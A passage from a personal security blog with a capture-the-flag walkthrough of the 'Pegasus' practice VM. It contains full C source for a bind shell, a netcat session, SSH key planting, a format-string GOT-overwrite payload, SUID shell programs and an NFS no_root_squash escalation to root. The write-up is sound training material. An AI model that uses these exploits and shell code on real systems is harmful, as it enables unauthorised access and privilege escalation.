<p>This was supposed to open me a <code>tcp/4444</code> shell, but to no avail. Infact, no shellcode related execution appeared to do anything. As a last resort before I figured I&rsquo;d need to get me some hints, I searched for some non-shellcode type bind shell generation C source. Unfortunately, I don’t write C socket software out of my head, but luckily Google came to the rescue and landed me on <a href="http://bigpointyteeth.se/code/bindshell.c">this</a>. I modified the code slightly by hardcoding my desired port and shell, and submitted it to be &lsquo;reviewed&rsquo;:</p>

<p>```c
// Source: <a href="http://webcache.googleusercontent.com/search?q=cache:52EC4LfMJX4J:bigpointyteeth.se/code/bindshell.c+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=za">http://webcache.googleusercontent.com/search?q=cache:52EC4LfMJX4J:bigpointyteeth.se/code/bindshell.c+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=za</a>
// <a href="http://bigpointyteeth.se/code/bindshell.c">http://bigpointyteeth.se/code/bindshell.c</a></p>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;sys/socket.h></h1>

<h1>include &lt;arpa/inet.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>define SHELL &ldquo;/bin/sh&rdquo;   // shell to execute</h1>

<h1>define NAME &ldquo;rsync&rdquo;        // name of the forked bindshell shown in ps</h1>

<p>int main(int argc, char *argv[]) {</p>

<pre><code>char msg[16];
int srv_sockfd, new_sockfd;
socklen_t new_addrlen;
struct sockaddr_in srv_addr, new_addr;

// fork into background
if (fork() == 0) {
    if ((srv_sockfd = socket(PF_INET, SOCK_STREAM, 0)) &lt; 0) {
        return -1;
    }

    srv_addr.sin_family = PF_INET;
    srv_addr.sin_port = htons(atoi("4444"));
    srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(srv_sockfd, (struct sockaddr *)&amp;srv_addr, sizeof(srv_addr)) &lt; 0) {
        return -1;
    }

    if (listen(srv_sockfd, 1) &lt; 0) {
        return -1;
    }

    // accept loop
    for (;;) {
        new_addrlen = sizeof(new_addr);
        new_sockfd = accept(srv_sockfd, (struct sockaddr *)&amp;new_addr, &amp;new_addrlen);
        if (new_sockfd &lt; 0) {
            return -1;
        }

        // fork to handle new connection
        if (fork() == 0) {
            // close old listener
            close(srv_sockfd);
            // print the parent pid which should be killed in order
            // to remove the persistant bindshell listener
            sprintf(msg, "ppid=%d\n", getppid());
            write(new_sockfd, msg, strlen(msg));

            dup2(new_sockfd, 2);
            dup2(new_sockfd, 1);
            dup2(new_sockfd, 0);

            execl(SHELL, NAME, NULL);
            return 0;
        }
        else
            close(new_sockfd);
    } // end accept loop
} // end fork into background
return 0;
</code></pre>

<p>}
```</p>

<p>All of my attempts were followed by a nmap on <code>tcp/4444</code> to see if the shell has become available. After submitting the above code, we got a new port open (this Mike guy is pretty fast you should hire him!):</p>

<p>```bash
root@kali:~# nmap 192.168.56.101 -p 4444</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-12-23 11:33 SAST
Nmap scan report for 192.168.56.101
Host is up (0.00034s latency).
PORT     STATE SERVICE
4444/tcp open  krb524
MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
```</p>

<p>Awesome, so lets connect and see what we have:</p>

<p><code>bash
root@kali:~# nc -v 192.168.56.101 4444
192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [192.168.56.101] 4444 (?) open
ppid=10450
id
uid=1001(mike) gid=1001(mike) groups=1001(mike)
</code></p>

<p>As was hoped for, a shell as <code>mike</code>. I quickly generated a new ssh key pair for Pegasus, and cat the public key to <code>mike</code>&rsquo;s <code>authorized_keys</code> file and went on to SSH in as mike:</p>

<p>```bash</p>

<h1>first I cat the public key so that I can copy it</h1>

<p>root@kali:~# cat pegasus.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R root@kali</p>

<h1>next I connect to the bind shell listener and move to Mikes .shh directory</h1>

<p>root@kali:~# nc -v 192.168.56.101 4444
192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [192.168.56.101] 4444 (?) open
ppid=10450
cd .ssh</p>

<h1>next we append my public key to mikes authorized_keys</h1>

<p>echo &ldquo;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R&rdquo; >> authorized_keys
ls -lh
total 12K
-rw-rw-r&mdash; 1 mike mike  381 Dec 23 20:36 authorized_keys
-rw&mdash;&mdash;&mdash;&ndash; 1 mike mike 1.7K Nov 18 12:39 id_rsa
-rw-r&mdash;r&mdash; 1 mike mike  222 Nov 18 17:39 known_hosts
chmod 600 authorized_keys
^C</p>

<h1>with the authorized_keys ready, I SSH in as mike using my key pair</h1>

<p>root@kali:~# ssh <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#58;&#109;&#x69;&#x6b;&#101;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#53;&#54;&#x2e;&#x31;&#48;&#x31;">&#109;&#x69;&#107;&#101;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#53;&#54;&#46;&#x31;&#x30;&#x31;</a> -i pegasus
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-39-generic i686)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a></li>
</ul>


<p>  System information as of Tue Dec 23 20:36:47 AEDT 2014</p>

<p>  System load:  0.0               Processes:           93
  Usage of /:   6.8% of 18.32GB   Users logged in:     0
  Memory usage: 12%               IP address for eth0: 192.168.56.101
  Swap usage:   0%</p>

<p>  => There are 2 zombie processes.</p>

<p>  Graph this data and manage this system at:</p>

<pre><code>https://landscape.canonical.com/
</code></pre>

<p>Your Hardware Enablement Stack (HWE) is supported until April 2017.</p>

<p>You have mail.
Last login: Tue Dec 16 19:27:53 2014 from 172.16.246.129
mike@pegasus:~$
```</p>

<h2>my_first, your_first, we_all_first</h2>

<p>With my initial shell I was able to start enumerating Pegasus a little more. The most obvious next step was the SUID binary in <code>mike</code>&rsquo;s home (we will get to it shortly):</p>

<p><code>bash
mike@pegasus:~$ ls -lh
total 16K
-rwxr-xr-x 1 mike mike  845 Nov 18 20:52 check_code.sh
drwx------ 2 mike mike 4.0K Nov 18 17:49 Mail
-rwsr-xr-x 1 john john 6.5K Nov 28 10:26 my_first
</code></p>

<p>More enumeration revealed that <code>/opt/</code> had a number of interesting parts to it as well:</p>

<p><code>bash
mike@pegasus:~$ ls -lh /opt/
total 12K
drwxrwxrwx 2 root root 4.0K Dec 23 20:33 code_review
drwxr-xr-x 3 root root 4.0K Nov 25 04:38 git
drwxr-xr-x 2 root root 4.0K Nov 18 14:43 nfs
</code></p>

<p>Piecing the web interface together, you will see that the submitted source is put into <code>code.c</code> in <code>/opt/code_review/</code>, and then compiled from the script in <code>/home/mike/check_code.sh</code> and eventually executed.</p>

<p>The <code>/opt/git/</code> folder had what looked like remnants of the typical <code>.git/</code> folders when you checkout code from a repo, but not the actual files itself. I poked around a bit, and was able to re-assemble the <code>main.c</code> file from the git history.</p>

<h3>rebuilding main.c</h3>

<p><em>This step is not essential in progressing with Pegasus, but I figured it would be an interesting approach nonetheless</em></p>

<p>Even though the git folder did not appear to have any actual source files, one could quickly learn what it contains. For example, the git log will show you the commit history:</p>

<p>```bash
mike@pegasus:/opt/git/my_first.git$ git log
commit 85365946a8142c52ee6040a029dd069b514c2ab0
Author: Mike Ross &lt;mike@pegasus.(none)>
Date:   Tue Nov 25 04:48:01 2014 +1100</p>

<pre><code>Committing some security fixes
</code></pre>

<p>commit 0a8af1ed956518ec078b152ad7571105e2df26c6
Author: John Wall &lt;john@pegasus.(none)>
Date:   Tue Nov 25 04:39:42 2014 +1100</p>

<pre><code>initial commit
</code></pre>

<p>```</p>

<p>From the log we can see that there as an initial commit, and one more after that with some <em>security fixes</em>. Chances are, if we can see what the initial commit was then we can see the full initial code. So, lets check out the details of commit <em>0a8af1ed</em>:</p>

<p>```diff
mike@pegasus:/opt/git/my_first.git$ git show 0a8af1ed
commit 0a8af1ed956518ec078b152ad7571105e2df26c6
Author: John Wall &lt;john@pegasus.(none)>
Date:   Tue Nov 25 04:39:42 2014 +1100</p>

<pre><code>initial commit
</code></pre>

<p>diff &mdash;git a/main.c b/main.c
new file mode 100644
index 0000000..39c0182
&mdash;&ndash; /dev/null
+++ b/main.c
@@ -0,0 +1,133 @@
+#include &lt;stdio.h>
+#include &lt;stdlib.h>
+
+int calculator();
+int string_replay();
+int string_reverse();
+int quit();
+
+int main()
+{
+    char selection[5];
+    int sel;
+    char * err_check;</p>

<p>[&hellip; snip &hellip;]
```</p>

<p>Nice! We have a file <code>main.c</code> that was added. I copied the diff and saved it to <code>init.patch</code>, and then ran the patch:</p>

<p><code>bash
root@kali:~# patch -p1 &lt; init.diff
patching file main.c
</code></p>

<p>That gives us the state of files after commit <em>0a8af1ed</em> which was labeled as the initial commit. The same process was followed for the next commit <em>85365946a8</em> which apparently included some <em>security fixes</em>. Copy the diff, make the .patch file and apply it. After this process, we have the sources up to where the git commit history has it.</p>

<p>I inspected that code before and after the security fixes commit, and noticed that the security fixes fixed a potential format string vulnerability. At least, that was the one my untrained eye was able to spot:</p>

<p>```diff
diff &mdash;git a/main.c b/main.c
index 39c0182..b6b2ed4 100644
&mdash;&ndash; a/main.c
+++ b/main.c
@@ -8,7 +8,7 @@ int quit();</p>

<p>[&hellip; snip &hellip;]
+</p>

<pre><code>     printf("Enter second number: ");
     if (fgets(numberB, sizeof numberB, stdin) != NULL)
     {
</code></pre>

<ul>
<li><pre><code>     int numA = strtol(numberA, &amp;err_check, 10);
     int numB = strtol(numberB, &amp;err_check, 10); 
     if (*err_check != '\n')
     {
</code></pre></li>
<li><pre><code>         printf("Error details: ");
</code></pre></li>
<li><pre><code>         printf(err_check);
</code></pre></li>
<li><pre><code>         printf("Error details: %s", err_check);
         printf("\n");
         return 1;
</code></pre>

<p>[&hellip; snip &hellip;]
```</p></li>
</ul>


<p><code>printf(err_check);</code> is the potentially vulnerable call&hellip; I think.</p>

<h3>the calculator with a hole</h3>

<p>After toying with the git repository, my attention turned back to the SUID binary. When I run <code>my_first</code>, I am actually running it as <code>john</code>. This means, should I be able to exploit it and do things other than what its intended for, I may affectively gain <code>john</code>&rsquo;s privileges! Sounds easy right. :P</p>

<p>I quickly realized that the <code>main.c</code> file I got out of the git repository, was the sources for the <code>my_first</code> binary. So, my focus shifted to the piece of code I saw the security fix for.</p>

<p>First, it was time to confirm my suspicion of a format string vulnerability:</p>

<p>```bash
mike@pegasus:~$ ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection: 1</p>

<p>Enter first number: 1
Enter second number: %x  <br/>
Error details: bf96cbec</p>

<p>Selection:
```</p>

<p><img class="<a" src="href="https://i.imgur.com/xrrpxFZ.png">https://i.imgur.com/xrrpxFZ.png</a>"></p>

<p>I don’t like format string vulnerabilities. In fact not at all. I was hoping for something else and at this stage, I was happy I found the bug (which was the code before the security fixes btw), but sad that its a format string.</p>

<p>Anyways, feels aside, it was time to work on a exploit.</p>

<p>For the format string exploit, I don&rsquo;t think its really worth explaining all the details again. In fact, compiling this exploit, I was referring to a older blogpost about <a href="https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/">Xerxes2</a> which also had a similar thing going. Feel free to check the binary section out there if the next part does not make much sense.</p>

<p><strong>EDIT</strong> I have since made a small asciinema showing the offset calculations on my Kali VM. Though the offsets are not the same the theory still applies. </p>

<script type="text/javascript" src="https://asciinema.org/a/14960.js" id="asciicast-14960" async data-theme="solarized-dark"></script>


<p></p>

<h3>punching more than numbers</h3>

<p><em>So here, I had a pretty big freaking fail. A massive one. Once I had determined the stack position to start corrupting memory with, I was punching in the format strings in the application itself. Meaning, I was giving it the ASCII \x\x\x\x and not the actual bytes as would have been the case if I was using python/printf to redirect the stdout of them to <code>my_first</code>&rsquo;s stdin. Anyways, lessons were learnt, caffeine was injected. It wont happen again. Big up to <a href="https://twitter.com/barrebas">@barrebas</a> for subtly pointing the fail out ;p</em></p>

<p>As I had seen the source code, it was easy to formulate a plan for the exploit. I would make use of a ret2libc attack by overriding the GOT entry for <code>printf()</code> using the format string to <code>system()</code> instead. This means, the next time <code>printf()</code> is called, it would actually execute <code>system()</code> with the adjacent argument on the stack. Lets see how this was done.</p>

<h4>compiling the format string</h4>

<p>We know that the 2nd number that the applications wants triggers our format string. So, lets prepare some skeleton input, piping it to the <code>./my_first</code> binary to sample a successful run:</p>

<p>```bash
mike@pegasus:~$ printf &lsquo;1\n1\n1\n4\n&rsquo; | ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Result: 1 + 1 = 2</p>

<p>Selection:
Goodbye!
```</p>

<p>Cool, so we have sampled adding 1 to 1 ;p Now we can get to exploiting the format string. The first step we have is to determine which parameter on the stack we have control of. We determine this by providing it with a string of 4 A&rsquo;s, and then incrementing the format string arguments by 1 until we can find the 4 A&rsquo;s. In my case, I will be formatting them as hex with <code>%x</code>, so I am searching for <code>41414141</code>. The format string will therefore start as <code>AAAA.0x%s</code>. Note that in the below example we are using 2 x percentages (2 x &lsquo;%&rsquo;) as it needs to be escaped in the shell:</p>

<p>```bash
mike@pegasus:~$ printf &lsquo;1\n1\nAAAA.0x%%x\n4\n&rsquo; | ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Error details: AAAA.0xbff5321c</p>

<p>Selection:
Goodbye!
```</p>

<p>And we have the output of <code>AAAA.0xbff5321c</code>. Yay :)
Continuously incrementing this will eventually get you to argument 8, where you will find the clean string of hex A&rsquo;s:</p>

<p>```bash
mike@pegasus:~$ printf &lsquo;1\n1\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\n4\n&rsquo; | ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Error details: AAAA.0xbfbd145c0xa0xb75b41600xb7726ac00xb7752ff40xb77539180xbfbd14600x41414141</p>

<p>Selection:
Goodbye!
mike@pegasus:~$
```</p>

<p>So, using direct parameter access in the format string, we can reference parameter 8 directly:</p>

<p>```bash
mike@pegasus:~$ printf &lsquo;1\n1\nAAAA.0x%%8$x\n4\n&rsquo; | ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Error details: AAAA.0x41414141</p>

<p>Selection:
Goodbye!
mike@pegasus:~$
```</p>

<p>Parameter 8 in the format string is the start of the section on the stack we can read now, shown in the output <code>AAAA.0x41414141</code> of the format string <code>AAAA.0x%8$x</code>.</p>

<p>Now we will move on to making use of the <code>%n</code> format string to write to a arbitrary area in memory. Where do we want to write? To the GOT where the lookup for <code>printf()</code> occurs ofc! Lets dump the GOT for <code>./my_first</code>, and determine where it will go look for <code>printf()</code>:</p>

<p>```bash
mike@pegasus:~$ objdump -R ./my_first</p>

<p>./my_first:     file format elf32-i386</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049bec R_386_GLOB_DAT    <strong>gmon_start</strong>
08049c20 R_386_COPY        stdin
08049bfc R_386_JUMP_SLOT   printf
08049c00 R_386_JUMP_SLOT   fgets
08049c04 R_386_JUMP_SLOT   puts
08049c08 R_386_JUMP_SLOT   <strong>gmon_start</strong>
08049c0c R_386_JUMP_SLOT   __libc_start_main
08049c10 R_386_JUMP_SLOT   putchar
08049c14 R_386_JUMP_SLOT   strtol
```</p>

<p>The location of <code>printf()</code> will be looked up at <code>08049bfc</code>. This is the part where we want to rewrite the address of <code>printf()</code> to that of libc&rsquo;s <code>system()</code>.</p>

<p>The last part we need is to know where <code>system()</code> actually is. An important vector that may influence this position in memory is known as ASLR, which will effectively cause the address of <code>system()</code> to be different every time <code>./my_first</code> is run. To combat this, a neat little trick to increase the stack size can be used using <code>ulimit</code>. <code>ulimit -s unlimited</code> will maximize the stack size, effectively causing the ASLR to be practically nonexistent:</p>

<p><code>bash
mike@pegasus:~$ ulimit -s
8192
mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ ulimit -s
unlimited
</code></p>

<p>With the ASLR problem out of the way, lets leak the address of <code>system()</code>:</p>

<p>```bash</p>

<h1>fire up gdb</h1>

<p>mike@pegasus:~$ gdb -q ./my_first
Reading symbols from /home/mike/my_first&hellip;(no debugging symbols found)&hellip;done.</p>

<h1>set a break point as we enter main()</h1>

<p>(gdb) b main
Breakpoint 1 at 0x804850f</p>

<h1>run the binary</h1>

<p>(gdb) r
Starting program: /home/mike/my_first</p>

<p>Breakpoint 1, 0x0804850f in main ()</p>

<h1>leak the current address of system()</h1>

<p>(gdb) p system
$1 = {<text variable, no debug info>} 0x40069060 <system>
(gdb)
```</p>

<p>And so we learn that <code>system()</code> lives at <code>0x40069060</code>. What does this all mean so far then? Well, we are now going to use the format string vulnerability to write (using <code>%n</code>) a new address for <code>printf()</code> in the GOT at <code>08049bfc</code> to point to <code>system()</code> at <code>0x40069060</code> instead of its real location.</p>

<p>For us to debug the application while we prepare the required padding for the format string, we will use the <code>printf()</code> used to pipe to <code>./my_first</code> to redirect to a file instead. Then, in <code>gdb</code>, we will run the binary, redirecting the input from the file we will compile with the <code>printf()</code>:</p>

<p>```bash</p>

<h1>so, instead of the 4 x A&rsquo;s, we will now place the address</h1>

<h1>in the GOT that we want to override, and use the %x format</h1>

<h1>string to attempt writing to it</h1>

<p>mike@pegasus:~$ printf &lsquo;1\n1\n\xfc\x9b\x04\x08%%8$n&rsquo; > t
mike@pegasus:~$ file t
t: data</p>

<h1>then, in gdb, we will grab the output of the new file called</h1>

<h1>t, and redirect it as input to my_first</h1>

<p>mike@pegasus:~$ gdb -q ./my_first
Reading symbols from /home/mike/my_first&hellip;(no debugging symbols found)&hellip;done.</p>

<h1>leak the current address that GOT points to for printf()</h1>

<p>(gdb) x/x 0x08049bfc
0x8049bfc <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x70;&#114;&#x69;&#x6e;&#x74;&#x66;&#64;&#103;&#x6f;&#116;&#x2e;&#112;&#x6c;&#x74;">&#112;&#114;&#105;&#110;&#116;&#x66;&#64;&#x67;&#111;&#x74;&#46;&#112;&#108;&#x74;</a>: 0x080483b6</p>

<h1>run the binary with our exploit (t) as input</h1>

<p>(gdb) r &lt; t
Starting program: /home/mike/my_first &lt; t</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Error details: ��</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()</p>

<h1>inspect the new address the GOT points to for printf()</h1>

<p>(gdb) x/x 0x08049bfc
0x8049bfc <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#112;&#x72;&#x69;&#110;&#116;&#x66;&#64;&#103;&#111;&#x74;&#46;&#112;&#x6c;&#116;">&#112;&#114;&#105;&#110;&#x74;&#x66;&#64;&#x67;&#x6f;&#x74;&#x2e;&#112;&#108;&#x74;</a>: 0x00000004
(gdb)
```</p>

<p>This is working exactly as expected. Now all that is left is to pad the format string so that we can have the address <code>0x40069060</code> instead of <code>0x00000004</code> written. For the math etc involved, refer to the Xerxes2 post I previously mentioned. The resultant format string was <code>\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n</code>, with a run in the debugger ending in:</p>

<p>```bash</p>

<h1>prep the input file</h1>

<p>mike@pegasus:~$ printf &lsquo;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&rsquo; > t
mike@pegasus:~$</p>

<h1>run it in the debugger</h1>

<p>(gdb) r &lt;t
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/mike/my_first &lt;t</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Error details: ����</p>

<p>[&hellip; snip &hellip;]</p>

<p>sh: 1: Selection:: not found</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x08c3f98c in ?? ()</p>

<h1>check where the GOT points to for printf()</h1>

<p>(gdb) x/x 0x08049bfc
0x8049bfc <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#58;&#x70;&#114;&#105;&#x6e;&#116;&#x66;&#x40;&#x67;&#111;&#x74;&#x2e;&#x70;&#x6c;&#x74;">&#112;&#114;&#x69;&#x6e;&#x74;&#x66;&#64;&#x67;&#x6f;&#x74;&#46;&#112;&#x6c;&#116;</a>: 0x40069060</p>

<h1>confirm system() is still there :)</h1>

<p>(gdb) p system
$1 = {<text variable, no debug info>} 0x40069060 <system>
```</p>

<p>The binary crashes with <code>sh: 1: Selection:: not found</code>, meaning that it is now trying to run <code>system("Selection:")</code> instead of <code>printf("Selection:")</code> due to the GOT override.</p>

<h4>finishing the exploit</h4>

<p>From here the exploit is pretty easy. We can use some $PATH trickery in our current shell to get <code>Selection:</code> to actually mean something, like prepare a small SUID C shell perhaps? :)</p>

<p>I quickly compiled some C wrapper code to prepare a shell and ran the exploit.</p>

<p>```bash</p>

<h1>Prep Selection: to make a SUID shell for john</h1>

<h1>and modify PATH</h1>

<p>mike@pegasus:~$ cat tojohn.c</p>

<h1>include &lt;stdio.h></h1>

<p>int main()
{</p>

<pre><code>system("cp /bin/sh /tmp/tojohn");
system("chmod 4777 /tmp/tojohn");
</code></pre>

<p>}
mike@pegasus:~$ gcc tojohn.c -o &ldquo;Selection:&rdquo;
mike@pegasus:~$ export PATH=/home/mike/:$PATH</p>

<h1>run the exploit&hellip;</h1>

<p>mike@pegasus:~$ printf &lsquo;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&rsquo; | ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Error details: ����</p>

<pre><code>                 10
</code></pre>

<p>Segmentation fault (core dumped)</p>

<h1>&hellip; and check /tmp</h1>

<p>mike@pegasus:~$ ls -lah /tmp/
total 108K
drwxrwxrwt  2 root root 4.0K Dec 23 23:17 .
drwxr-xr-x 22 root root 4.0K Nov 19 02:58 ..
-rwsrwxrwx  1 john mike  98K Dec 23 23:17 tojohn
mike@pegasus:~$
```</p>

<p>We have a new file <code>tojohn</code> in <code>/tmp</code> :D</p>

<p><code>bash
mike@pegasus:~$ /tmp/tojohn
$ id
uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
</code></p>

<h2>hoofing (rooting) Pegasus</h2>

<p>I added the public key of the keypair I generated for Pegasus to <code>john</code>&rsquo;s authorized_keys file and proceeded to SSH in as him.</p>

<p>Quick enumeration showed that <code>mike</code> is allowed to start the nfs daemon via <code>sudo</code>:</p>

<p>```bash
john@pegasus:~$ sudo -l
Matching Defaults entries for john on this host:</p>

<pre><code>env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</code></pre>

<p>User john may run the following commands on this host:</p>

<pre><code>(root) NOPASSWD: /usr/local/sbin/nfs
</code></pre>

<p>john@pegasus:~$ sudo nfs
Usage: nfs [start|stop]
john@pegasus:~$ sudo nfs start
 * Exporting directories for NFS kernel daemon&hellip;                                                                                                                                 [ OK ]
 * Starting NFS kernel daemon                                                                                                                                                     [ OK ]
john@pegasus:~$
```</p>

<p>I checked out the <code>/etc/exports</code> file, and noticed the the <code>no_root_squash</code> flag for the <code>/opt/nfs</code> export. This is most certainly the way to root Pegasus as nfs will not go and nobody my files :)</p>

<p>So, I mounted the share&hellip;</p>

<p><code>bash
root@kali:~# mkdir nfs
root@kali:~# mount 192.168.56.101:/opt/nfs nfs
</code></p>

<p>&hellip; prepped a SUID shell &hellip;</p>

<p>```bash
root@kali:~/Desktop/pegasus/nfs# cat shell.c</p>

<h1>include &lt;stdio.h></h1>

<p>int main()
{</p>

<pre><code>setuid(0);
setgid(0);
system("/bin/sh");
</code></pre>

<p>}
root@kali:~/Desktop/pegasus/nfs# gcc shell.c -o shell
root@kali:~/Desktop/pegasus/nfs# chmod 4777 shell
root@kali:~/Desktop/pegasus/nfs# ls -lah
total 20K
drwxr-xr-x 2 root root 4.0K Dec 23 14:39 .
drwxr-xr-x 3 root root 4.0K Dec 23 14:32 ..
-rwsrwxrwx 1 root root 5.0K Dec 23 14:39 shell
-rw-r&mdash;r&mdash; 1 root root   79 Dec 23 14:39 shell.c
```</p>

<p>&hellip; and rooted Pegasus :)</p>

<p>```bash
john@pegasus:~$ /opt/nfs/shell</p>

<h1>id</h1>

<p>uid=0(root) gid=0(root) groups=0(root),1000(john)
```</p>

<h2>flag :)</h2>

<p>```text</p>

<h1>cat /root/flag</h1>

<pre><code>           ,
           |`\        
          /'_/_   
        ,'_/\_/\_                       ,   
      ,'_/\'_\_,/_                    ,'| 
    ,'_/\_'_ \_ \_/                _,-'_/
  ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek
</code></pre>

<p>   ( (&lsquo; )\/(<em> _ \&rsquo;</em>,\   <em><em>&mdash;&lsquo; </em>,&ndash;</em>/<em>,&ndash;&rsquo;,</em>/ _\      mythology. He is a winged</p>

<pre><code>\_`\&gt; 6` 7  \'_,/ ,-' _,-,'\,_'_ \,_/'_,\       stallion usually depicted
 \/-  _/ 7 '/ _,' _/'\_  \,_'_ \_ \'_,/         as pure white in color.
  \_'/&gt;   7'_/' _/' \_ '\,_'_ \_ \'_,\          Symbol of wisdom and fame.
    &gt;/  _ ,V  ,&lt;  \__ '\,_'_ \_ \'_,/
  /'_  ( )_)\/-,',__ '\,_'_,\_,\'_\             Fun fact: Pegasus was also
 ( ) \_ \|_  `\_    \_,/'\,_'_,/'               a video game system sold in
  \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.
   \_)   &gt;        `\_                           It was a hardware clone of
        /  `,      |`\_                         the Nintendo Famicom.
       /    \     / \ `\
      /   __/|   /  /  `\  
     (`  (   (` (_  \   /   
     /  ,/    |  /  /   \   
    / ,/      | /   \   `\_ 
  _/_/        |/    /__/,_/
 /_(         /_( 
</code></pre>

<p>CONGRATULATIONS! You made it :)</p>

<p>Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
learnt a thing or two while doing it! :)</p>

<p>Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
providing first review.</p>

<p>Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
and leave some feedback, I would love to hear from you!</p>

<p>Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
more awesome boot2root VMs!
```</p>

<p>Thanks for the fun <a href="https://twitter.com/theknapsy">@TheKnapsy</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[solving kvasir - netcat edition]]></title>
    <link href="http://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition/"/>
    <updated>2014-11-09T10:27:09+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition</id>
    <content type="html"><![CDATA[<h2>introduction</h2>

<p><a href="http://vulnhub.com/entry/kvasir-i,106/">Kvasir</a>, a boot2root by <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> has to be one of my most favorite boot2roots to date, if not the most favorite. Favorite however does not mean it was easy. It also proved to be one of the most challenging ones I have had the chance to try!</p>

